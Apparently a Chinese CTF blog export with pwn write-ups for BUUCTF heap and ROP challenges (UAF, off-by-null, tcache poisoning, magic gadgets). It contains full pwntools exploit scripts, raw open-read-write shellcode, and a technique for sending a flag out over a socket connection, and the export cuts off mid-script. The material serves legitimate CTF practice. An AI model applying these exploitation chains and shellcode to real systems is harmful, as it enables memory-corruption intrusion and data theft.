        <content type="html"><![CDATA[<h3 id="保护策略：">保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442042.png" alt="image-20221112144214948"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442447.png" alt="image-20221112144230347"></p><h3 id="程序分析：">程序分析：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442191.png" alt="image-20221112144247139"></p><p>delete函数中存在一个UAF漏洞(如上)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442868.png" alt="image-20221112144257829"></p><p>在add函数中的size最大为0x1000,因此可以申请进入unsorted bin中的堆块，同时程序中存在show函数。</p><h3 id="利用思路：">利用思路：</h3><p>看其他师傅的wp，发现基本都是去拿到libc地址后泄露了一个栈地址(利用environ来泄露)。但其实这道题没有这么麻烦，并不需要泄露栈地址的，这里记录下利用思路。</p><p>首先让堆块进入unsorted bin，然后执行show函数来泄露libc地址。</p><p>由于本题开了沙箱，我们考虑用orw的方式，但是因为libc为2.23的，无法申请出来free_hook导致了没法用setcontext来设置寄存器打orw。</p><p>但是我们发现程序往栈里输入了大量的数据(如下),就给了我们rop的机会(尽管我们无法溢出控制返回地址)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121443695.png" alt="image-20221112144309646"></p><p>在劫持malloc_hook之前我们拿到了libc地址，因此我们如果去劫持malloc_hook为add rsp,0x38;ret(0x38是调试出来的)，当下一次执行malloc的时候就会让栈顶增加0x38，然后执行ret的时候就可以劫持到我们最初输入的rop链上(如下)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121443683.png" alt="image-20221112144337170"></p><p>此时我们有了libc地址，于是我们考虑用程序原本的gadget去执行一下read函数，将rop链读到bss段上，最后用pop rsp这个gadget让栈迁移到bss段进行第二次rop，而这次的rop链中我们就可以写入libc中的地址了，我采用的是执行了mprotect函数让bss段变成可读可写可执行的，后面紧跟着orw的shellcode即可。</p><p>总结一下这道题需要注意几点:</p><ol><li>写orw的shellcode时，要用close函数先关闭文件描述符0，再用openat系统调用(因为本题把open也给禁了，这个是在程序里实现的)去读出flag文件。</li><li>本程序中，自己设置了一个反调试的功能，所以需要自己用ida把相关指令给nop掉，才能进行调试。</li><li>最后栈迁移到bss段使用的是程序中原本的一个gadget: pop rsp</li></ol><h3 id="EXP">EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25919&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size?\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content?\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401193</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401191</span></span><br><span class="line">bss_addr=<span class="number">0x602080</span></span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x000000000040118d</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rsp_r13_r14_r15)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;what is your name? \n&quot;</span>,payload)</span><br><span class="line">add(<span class="number">0x800</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">add_rsp_ret=libc_base+<span class="number">0x0000000000143f08</span><span class="comment">#0x0000000000143e08#</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">mprotect_addr=libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(add_rsp_ret)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">debug(p,<span class="number">0x4010FB</span>,<span class="number">0x4010EF</span>,<span class="number">0x4010E3</span>,<span class="number">0x400C11</span>,<span class="number">0x400B2F</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">orw=<span class="string">b&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x602000</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect_addr)</span><br><span class="line">payload+=p64(<span class="number">0x6020e0</span>)</span><br><span class="line">payload+=orw</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121444189.png" alt="image-20221112144403666"></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> double free </tag>
            
            <tag> 沙箱 </tag>
            
            <tag> UAF </tag>
            
            <tag> 栈堆结合 </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_s_1</title>
      <link href="/posts/f5fe6d2b.html"/>
      <url>/posts/f5fe6d2b.html</url>
      
        <content type="html"><![CDATA[<h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220906222410458-1956148377.png" alt=""></p><h2 id="漏洞所在：">漏洞所在：</h2><p><img src="../img/2706180-20220906222419536-1535739468.png" alt=""></p><p>在edit函数中存在一个off by null漏洞。</p><h2 id="程序分析：">程序分析：</h2><p><img src="../img/2706180-20220906222442298-1594138131.png" alt=""></p><p>在add函数中，对malloc申请的内存大小做了限制，需要小于0x100并且大于0x7f的堆块才行，然后索引我们可以使用0到31(32没法用，因为这里的len[32]和heap[0]是一个内存单元，如果用了32，那么len[32]就有数据了，到了申请索引为0号堆块的时候，heap[0]有内容，就会进入if程序退出)</p><p>edit函数中存在一个off by null，并且有个key1的限制，导致了edit函数只能执行两次。</p><p>show函数表面感觉能使用，但是key2在bss段，默认值为0，所以show函数我们无法正常使用(如下图)</p><p><img src="../img/2706180-20220906222455658-560983424.png" alt=""></p><p>delete函数可以无限次使用，但是不存在漏洞。</p><h2 id="大致思路：">大致思路：</h2><p>程序的libc版本为2.29,我们常规打一个off by null做一个堆块重叠，但是由于我们无法直接释放掉堆块让其进入unsorted bin(而off by null做的堆块合并需要让堆块位于unsorted bin中)，所以在这之前我们需要tcachebin中填满堆块(不必担心索引的问题，我们有32个索引可以用，同时delete函数还可以清空索引中内容)</p><p>然后打一个off by null，此时的堆块布局应该如下：</p><p>这个merge chunk的prev size被修改为了0x200  (merged chunk之所以可以进入unsorted bin中是因为在这之前tcahce bin中已经装了七个chunk了)</p><p><img src="../img/2706180-20220906222534768-1045740973.png" alt=""></p><p>然后我们释放掉merge chunk，触发合并，打一个堆块重叠，然后做一个double free出来。接着打tcache poisoning,我们去将堆块的fd指针去修改为0x6021d0这个地址，因为这个地址既属于我们的heap指针数组，同时加上0xf0后还可以去修改key1和key2。</p><p>(其实这道题看见key这个名字同时联想下key1和key2的作用，很容易想到去篡改这两个值，不然edit用不了，我们之后的各种手法都会失效，而修改key2还可以使用show函数)，但如果仅仅是修改key值的话，就导致了我们之后还要再打一遍off by null，但是0xf0这个链已经成-1坏掉了，应该就没法利用了(我没有仔细考虑这种方法，但是我试了下，这0xf0链坏掉之后，off by null就没法再打一次了，如果最开始做三个相同的堆块地址，保证0xf0的这个链不会在第一次打个double free就坏掉，应该也可以利用(但是我没有试，这只是我的一个思路))</p><p>但是我当时看了下bss段存储的数据，发现可以同时控制key1、key2和heap指针数组里的内容，就是申请到0x6021d0这个地址，这个地址位于heap[31]，我们先申请出来修改key1和key2的值，然后执行show函数拿到libc地址，再去往0x6021d0这个地址上写入free_hook的地址，最后编辑heap[31]这个块，写入system的地址即可。</p><h2 id="EXP">EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400DEE</span></span><br><span class="line">d_a=<span class="number">0x400DE2</span></span><br><span class="line">d_e=<span class="number">0x400DFA</span></span><br><span class="line">d_s=<span class="number">0x400E06</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27970&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">31</span>,<span class="number">0xf8</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xf0</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0xf0</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0xf0</span>,<span class="string">&#x27;e&#x27;</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(i)   </span><br><span class="line">    delete(<span class="number">7</span>) </span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">    delete(<span class="number">9</span>)<span class="comment">#off by null，触发堆块合并</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将tcache bin给清空，给接下来的tcache poisoning做准备</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">    add(<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">    edit(<span class="number">13</span>,p64(<span class="number">0x6021d0</span>))<span class="comment">#tcache poisoning</span></span><br><span class="line">    add(<span class="number">14</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">15</span>,<span class="number">0xf0</span>,p64(<span class="number">0</span>)*<span class="number">29</span>+p32(<span class="number">1</span>)+p32(<span class="number">3</span>))<span class="comment">#修改两个key</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xe0</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ebd90</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">15</span>,p64(<span class="number">0</span>)+p64(free_hook))</span><br><span class="line">    <span class="comment">#debug(p,d_a,d_d,d_e,d_s,0x400A25) </span></span><br><span class="line">    edit(<span class="number">31</span>,p64(sys_addr))</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220906222614225-57262606.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> off_by_null </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easyrop_2022胖哈勃春季赛</title>
      <link href="/posts/d0e6a746.html"/>
      <url>/posts/d0e6a746.html</url>
      
        <content type="html"><![CDATA[<h1>总结：</h1><p>通过这道题的学习与总结：</p><p>1、rep指令是进行循环，movs qword ptr [rdi],qword ptr[rsi]则可以拷贝，二者结合就是可以大规模拷贝数据到另一个内存空间。而想实现它，仅仅只需要控制rdi和rsi以及rcx寄存器即可。</p><p>2、我们往可读可写可执行的内存中写入的任何机器码都是可以被当做指令来执行的，而想执行这些指令，仅仅用ret或者call跳转到这些指令所在地址即可**（ret和call要的是指令所在地址，并非指令）**</p><p>3、关闭标准输出，没有回显时，可以利用magic_gadget来去获取一些我们需要的函数。</p><p>4、开启沙箱并且三个文件描述符全关时（意味着orw读取的flag也无法看见），可以用socket+connect将flag发送到这个新开的文件上（毕竟close关闭的仅仅是当前终端的0,1,2)</p><h1>保护策略：</h1><p><img src="../img/2706180-20220426101917635-1568812321.png" alt=""></p><p><img src="../img/2706180-20220426101928743-1588465175.png" alt=""></p><h2 id="canary开了，就没法直接溢出？">canary开了，就没法直接溢出？</h2><p>此时来到的要讲的第一点，checksec是检测出了canary的，但是用gdb调试之后发现，并没有看见canary（如下图），而返回地址是直接被垃圾数据覆盖了。</p><p><img src="../img/2706180-20220426101943521-1024948707.png" alt=""></p><p>这是因为出题人编译程序的时候只使用了 fstack-protector  选项，而非使用的 fstack-protector-all  。</p><p>简单来说， <strong>fstack-protector-all  选项会对每一个函数都插入一个canary的值，但缺点是会增加很多额外的栈空间</strong>，增加程序体积。<strong>而开启了fstack-protector  选项则是在具有局部数组变量的函数（数组大小超过八字节）才会插入canary，缺点是保护能力有限</strong>。</p><p>了解了上述内容后，开启fstack-protector  选项就会出现这种情况，如果是定义的int类型的变量，而后面又使用了输入函数从这个变量开始写入字节且**<font color=red>输入函数写入的字节大于了变量类型的字节数</font>，就会出现检查的时候明明有canary保护，但是依旧可以正常溢出的这种情况**（如下图）。</p><p><img src="../img/2706180-20220426101952307-600170163.png" alt=""></p><h1>程序分析：</h1><p>程序整体流程非常简单，存在0x1b0的溢出。然后close函数关闭了标准输入、标准输出、标准错误，<strong>就是程序没回显且无法多次输入</strong>。另外开了沙箱保护，无法执行execve来获取shell。那orw?可是标准输出也被关了（之前也做过关闭文件描述符的，不过那几道都没有把文件描述符全部关闭，因此获取shell的时候重定向一下文件描述符就ok了，不过这道题三个描述符全关，没办法重定向文件描述符）</p><p>因此这道题采用的对抗策略是一种特殊的orw，使用socket+connect+orw。即创建一个套接字然后connect与一个ip和端口所绑定，再orw，读取flag，将flag打印到新开的socket上，下面仔细讲一下这些都是个什么东西。</p><h1>大致思路：</h1><h3 id="socket函数和connect函数咋理解？">socket函数和connect函数咋理解？</h3><p>具体解释的话可以看一下官方文档，我谈一下自己的理解。(这两个函数布置参数时，需要注意的地方，我做了相关解释，都放在了文末)</p><p><strong>socket函数就是去创建一个套接字</strong>（这个套接字很抽象，不过linux中万物皆文件，我就先试着把它理解为一个文件），如果单独使用的话，它仅仅会创建和声明一下这个’文件’的特征，然后返回一个文件描述符（指向了创建的这个文件）。但此时它还是个空壳子，并没有灵魂。</p><p><strong>而connect函数的作用就是赋予刚刚那个空壳子灵魂</strong>，也就是<strong>将网络的地址与这个文件联系起来</strong>。使用connect函数之后，网络的一个地址及端口就算与socket绑定了,此时发送到socket上的数据就发到了与其绑定的ip的端口上。</p><p>也就是说现在的大致思路出来了，但是有很多地方的细节问题还要解决，因为程序里没有socket函数和connect函数，但现在还需要使用，那我们只能去系统调用。</p><p><img src="../img/2706180-20220426102004222-1183097211.png" alt=""></p><p>没有syscall…   不过我们可以利用magic gadget造一个出来</p><h1>magic gadget</h1><h2 id="什么是magic-gadget？">什么是magic gadget？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br><span class="line">nop    DWORD PTR [eax+eax*1+0x0]</span><br><span class="line">repz ret</span><br></pre></td></tr></table></figure><p>magic gadget似乎是一种统称？就是上面这种神奇的小玩意，师傅们都叫它magic gadget，似乎并不单指某个gadgets，因为前一段做<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>的时候，碰见了另一个magic_gadgets。</p><h2 id="magic-gadget它有什么用？">magic gadget它有什么用？</h2><p>这个gadget的核心就在于</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br></pre></td></tr></table></figure><p>可以看出来它可以去修改ebp-0x3d所指向的内容，<strong>只要我们能够控制rbp和ebx，那就可以去修改任意地址的任意值了</strong>（我们可以借此来实现修改got表，或者是往bss段写任意数据）</p><h2 id="magic-gadget应该怎么去利用？">magic gadget应该怎么去利用？</h2><p>首先我们要想办法控制rbp和ebx的值，这一点我们可以通过程序中的csu片段来做到。</p><h3 id="先说修改got表">先说修改got表</h3><p>既然add增加的是rbp-0x3d所指向的数据，而ebx又是增加的值，我就以这道题获取syscall的方法为例说明一下。</p><p>由于在alarm函数里syscall距离alarm函数的真实地址偏移仅仅为5，那岂不是说我<strong>ebx存一个5，然后让rbp-0x3d为alarm的got地址，执行magic gadget就可以修改alarm的got表为syscall的真实地址</strong>。如此我们再执行alarm函数的时候，就相当于执行的是syscall。</p><blockquote><p>此时这里就有一个坑，想执行syscall的时候，我应该用alarm的got地址还是plt地址？ 答案放在了文末</p></blockquote><h3 id="再说往bss段中任意写入数据">再说往bss段中任意写入数据</h3><p>其实说写入数据就应该想到一个疑问，add指令是进行加法，咋就能直接去写入<strong>任意</strong>数据了，如果rbp-0x3d指向的位置原本就有数据，还能任意写？</p><p>答案是不能的，这只是一个magic gadget，又不是一个无敌gadget，指令确实只能相加，可注意审题，我说的是<strong>往bss段任意写入数据</strong>。bss段有什么特点？<strong>它属于静态内存分配，程序一开始就会对这个段进行清零</strong>。既然<strong>bss段里面都是0，那就相当于我不管add什么，都是相当于我往里面写了什么</strong>。因此用magic gadget在对bss段进行操作的时候，是可以达到任意地址任意写的（不过值得一提的是，<strong>由于偏移是放在ebp中的，因此在64位程序里面，用magic gadget写的时候，一次只能写入四个字节</strong>）</p><h2 id="寻找magic-gadget">寻找magic gadget</h2><p>这个神奇的小东西存在于__do_global_dtors_au这个函数中，它是gcc编译器自身的一个函数，作用是析构函数。但是<strong>在ida查看会发现这段gadget并不存在，但是可以通过将机器码错位得到我们想要的gadget</strong>。</p><p><img src="../img/2706180-20220426102017372-286472307.png" alt=""></p><p>现在看一下ida正常的两个指令，以及他们对应的十六进制机器码<img src="../img/2706180-20220426102025440-653483116.png" alt=""><br><img src="../img/2706180-20220426102033744-1476514134.png" alt=""></p><p><img src="../img/2706180-20220426102057610-1265266427.png" alt=""></p><p><img src="../img/2706180-20220426102206921-1073508038.png" alt=""></p><p>发现将机器码再转成汇编，确实是原来的指令。不过我们现在去拿01 5d c3这段机器码（也就是上面两个指令之间的一部分）去得到我们想要的magic gadget（如下图）<br><img src="../img/2706180-20220426102217546-987677091.png" alt=""></p><p><strong>理论上这个gadget在每个64位程序都存在（不过需要机器码错位得到）</strong>。</p><p>需要的时候，直接用Ropgadget搜这个机器码就可以了。（参数是opcode)<br><img src="../img/2706180-20220426102225206-1415630040.png" alt=""></p><h3 id="怎么理解这个错位得到的机器码？">怎么理解这个错位得到的机器码？</h3><p><img src="../img/2706180-20220426102239185-1717796383.png" alt=""></p><p>观察上图，很容易就会有一个问题，CPU如何知道这个机器指令的长度？</p><p>其实啊，每个指令由操作码和操作数两部分组成，CPU设计好的时候，指令集就已经确定了，CPU对每条指令都规定了对应的机器码，<strong>CPU刚开始读取指令的时候，并不知道这个指令的长度，不过它会先读取操作码，读完操作码之后，它就知道这个指令应该是多长了，从而再去读对应字节的操作数</strong>。</p><p>这样再理解错位机器码的时候就很容易了，CPU面对的只有二进制01（上面写成十六进制是方便理解），只要你能确保你想要的指令是存在于代码段的，尽管他们在ida里是看不到的。却依然可以去拿这个指令去执行，<strong>因为CPU并不会去检查你这个指令是否是程序中正常的指令，即使你是错位得到的</strong>。</p><h2 id="一个字节太多的payload">一个字节太多的payload</h2><p>现在也有了syscall，那按理说可以去进行系统调用socket和connect了吧？<br><img src="../img/2706180-20220426102259813-2020062452.png" alt=""></p><p>也没有rax…，程序里也没有任何与rax有关的指令。</p><p>但是libc里啥都有，因此我们的对策是在libc里找到pop rax ; ret指令，然后将其覆写到无用函数的got表里。</p><p>继续采用magic gadget。大致思路就是去拿到libc中无用函数的偏移再拿到libc中pop rax;ret的偏移，然后计算二者偏移放入ebx，然后rbp-0x3d写入无用函数的got地址，执行magic gadget即可。去libc中找函数偏移的时候踩了个坑，在文末记录了一下。</p><p>接着思路就很简单了，用magic gadget凭空造出来我们需要的东西，然后去用ret2syscall的手法来执行socket+connect+open+read+write函数即可。真的这么简单么？ 我们似乎忘记了，这道题是有溢出限制的。0x1b0个字节的溢出，看起来很多，但是真正实现起来刚才的思路会发现溢出远远不够。</p><p>下面是上面思路所对应的exp（不想仔细研究的可以不研究，毕竟这个不是本题正确的exp，只是放一下上面思路的exp（这个如果溢出足够的话，这个exp是可以打通的））</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alarm_plt_addr=e.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_got_addr=e.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">close_got_addr=e.got[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">close_plt_addr=e.plt[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">prctl_got_addr=e.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">prctl_plt_addr=e.plt[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x40086A</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400903</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x400901</span></span><br><span class="line">bss_addr=<span class="number">0x601100</span></span><br><span class="line">magic_gadget_addr=<span class="number">0x400618</span></span><br><span class="line">gadget=<span class="number">0x4008fa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此时在将flag写入bss段</span></span><br><span class="line">payload=<span class="number">16</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=<span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span><span class="comment">#这里即使最后ebx只能传送前四字节，但依然要用\x00来补齐</span></span><br><span class="line"><span class="comment"># 不然会导致后面地址与flag会在同一个内存单元</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时在将sockaddr结构写入bss段</span></span><br><span class="line"><span class="comment"># 127.0.0.1 1000 其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET</span></span><br><span class="line"><span 